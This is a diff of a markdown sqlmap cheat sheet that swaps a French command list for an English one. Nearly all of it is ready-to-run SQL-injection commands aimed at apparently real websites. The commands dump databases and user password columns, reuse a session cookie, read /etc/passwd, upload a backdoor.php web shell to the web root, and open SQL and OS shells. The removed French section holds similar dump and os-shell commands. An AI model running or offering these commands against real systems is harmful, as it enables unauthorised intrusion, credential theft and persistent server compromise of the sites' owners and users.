@@ -1,73 +1,170 @@
+# SqlMap Quick CheatSheet
 
 
-"## SQLMap Cheat Sheet pour Console"
+__URL WRITING__
 
- "\n### Commandes Automatiques"
+__Single URL__
+```console
+sqlmap -u http://signisasia.net/books/view?id=1 --dbs
+```
 
-echo -e "\n#### Scanner une URL de manière automatique"
-echo "sqlmap -u \"http://siteatester.fr\""
+__Input Request in File__
 
-echo -e "\n#### Scanner une URL avec un paramètre GET"
-echo "sqlmap -u \"http://siteatester.fr?id=1\""
+- Capture the request with httpheader,burpsuite
+- Save it to req.txt
+```console
+sqlmap -r request.txt
+```
 
-echo -e "\n#### Scanner une URL avec des paramètres POST"
-echo "sqlmap -u \"http://siteatester.fr\" --data=\"PARAMETRE1=VALEUR1&PARAMETRE2=VALEUR2\""
 
-echo -e "\n### Préciser les Paramètres"
+__Input Request in File(Test only username parameter)__
 
-echo -e "\n#### Préciser le paramètre sur lequel réaliser l’injection"
-echo "sqlmap -u \"http://siteatester.fr?param1=valueur1&param2=valueur2\" -p param1"
+- Capture the request with httpheader,burpsuite
+- Save it to req.txt
+```console
+sqlmap -r req.txt -p username
+```
 
-echo -e "\n#### Préciser le type de base de données (mysql)"
-echo "sqlmap -u \"http://siteatester.fr\" --dbms=mysql"
 
-echo -e "\n### Listage"
+__Testing a pattern of URL's__
 
-echo -e "\n#### Lister les bases de données"
-echo "sqlmap -u \"http://siteatester.fr?id=1\" --dbs"
+- If we have test for a URL scheme injection like 
 
-echo -e "\n#### Lister les tables d’une base spécifique"
-echo "sqlmap -u \"http://siteatester.fr\" -D \"nom_de_la_database\" --tables"
+```console
+http://signisasia.net/books/1/view
+http://signisasia.net/books/2/view
+http://signisasia.net/books/3/view
+```
 
-echo -e "\n#### Lister les colonnes d’une table spécifique"
-echo "sqlmap -u \"http://siteatester.fr\" -D \"nom_de_la_database\" -T \"nom_de_la_table\" --columns"
+- The following URL's can be used to test all the URL's
 
-echo -e "\n### Dump"
+```console
+sqlmap -u http://signisasia.net/books/*/view --dbs
+```
 
-echo -e "\n#### Dump tout ce qu’SQLMap trouve"
-echo "sqlmap -u \"http://siteatester.fr\" --dump"
+__[Post injection Direcltly]__
+```console
+sqlmap -u http://imranparray.com/login.php --data "username=imx&pass=imx100&submit=Submit" -p username
 
-echo -e "\n#### Dump une base de données spécifique"
-echo "sqlmap -u \"http://siteatester.fr\" -D \"nom_de_la_database\" --dump"
+> --data is the post data send in the request
+> -p is the injection point.
+```
 
-echo -e "\n#### Dump une table spécifique"
-echo "sqlmap -u \"http://siteatester.fr\" -D \"nom_de_la_database\" -T \"nom_de_la_table\" --dump"
 
-echo -e "\n#### Dump seulement des colonnes spécifiques d’une table"
-echo "sqlmap -u \"http://testsite.com/login.php\" -D site_db -T users -C username,password --dump"
 
-echo -e "\n### Cookies"
 
-echo -e "\n#### Utiliser des cookies dans la requête"
-echo "sqlmap -u \"http://siteatester.fr\" --cookie=\"COOKIE1=VALEUR1;COOKIE2=VALEUR2\""
+__Using Cookies__
+```console
+sqlmap -u http://imranparray.com/welcom.php --cookie="PHPSESSID=adsaasd56454a6s54d54" -u http://imranparray.com/welcome/functionality.php?id=100
+```
 
-echo -e "\n### Proxy"
 
-echo -e "\n#### Passer le trafic de SQLMap via un proxy"
-echo "sqlmap -u \"http://siteatester.fr\" --proxy=http://proxy:port"
+__Scanning multiple targets__
 
-echo -e "\n#### Passer le trafic de SQLMap via Tor"
-echo "sqlmap -u \"http://siteatester.fr\" --tor --tor-type=SOCKS5 --check-tor"
+```console
+sqlmap -m urls.txt -dbs --batch'
 
-echo -e "\n### Reverse Shell"
+```
 
-echo -e "\n#### Obtenir un reverse shell OS"
-echo "sqlmap -u \"http://siteatester.fr\" --os-shell"
+## Exploitation
 
-echo -e "\n#### Obtenir un shell SQL"
-echo "sqlmap -u \"http://siteatester.fr\" --sql-shell"
 
-echo -e "\n### Autres Commandes Utiles"
-# Ici vous pouvez continuer avec les autres commandes utiles que vous souhaitez ajouter
+__Extract Databases__
+```console
+sqlmap -u http://signisasia.net/becomemember.php?id=14 --dbs 	
+```
+__Extract Tables from database__
+```console
+sqlmap -u http://signisasia.net/becomemember.php?id=14 -D database --tables
+```
 
-# Notez que cette approche simplifie la copie et le collage des commandes directement depuis la console.
+__Extract Columns of table_name from database__
+```console
+sqlmap -u http://signisasia.net/becomemember.php?id=14 -D database -T table_name --columns
+```
+
+__Dumping Data__
+```console
+sqlmap -u http://signisasia.net/becomemember.php?id=14 -D database -T table_name -C colum1,column2,clumn3 --dump
+```
+
+
+
+
+
+## Speeding Up The process
+
+__Multithreading__
+```console
+sqlmap -u http://signisasia.net/books/view.php?id=100 --dbs --threads 5
+```
+
+
+__Null-Connection__
+
+```console
+sqlmap -u http://signisasia.net/books/view.php?id=100 --dbs --null-connection
+```
+
+__HTTP Persistant Connection__
+
+```console
+sqlmap -u http://signisasia.net/books/view.php?id=100 --dbs --keep-alive
+```
+
+__Output prediction__
+
+```console
+sqlmap -u http://signisasia.net/books/view.php?id=100 -D database -T user -c users,password --dump --predict-output
+```
+
+
+
+## File Privileges
+
+__[Checking privilages]__
+
+```console
+sqlmap -u http://signisasia.net/books/view.php?id=100 --privileges
+```
+
+__Reading Files from the server__
+```console
+sqlmap -u http://signisasia.net/books/view.php?id=100 --file-read=/etc/passwd
+```
+
+__Uploading Files/Shell__
+```console
+sqlmap -u http://signisasia.net/books/view.php?id=100 --file-write=/root/imxx/backdoor.php --file-dest=/var/www/imran.php
+```
+
+
+
+
+
+
+
+
+## Getting Shells
+
+
+__Sql Shell__
+
+```console
+sqlmap -u http://imranparray.com/login.php?id=100 --sql-shell
+```
+
+__OS shell__
+```console
+sqlmap -u http://imranparray.com/login.php?id=100 --os-shell
+```
+
+__Os Command Exe without Shell Upload__
+```console
+sqlmap -u http://imranparray.com/login.php?id=100 --os-cmd "uname -a"
+```
+
+__Using Proxy__
+```console
+sqlmap --proxy="127.0.0.1:8888" -u https://imranparray.com/home.php?id=12 --dbs
+```
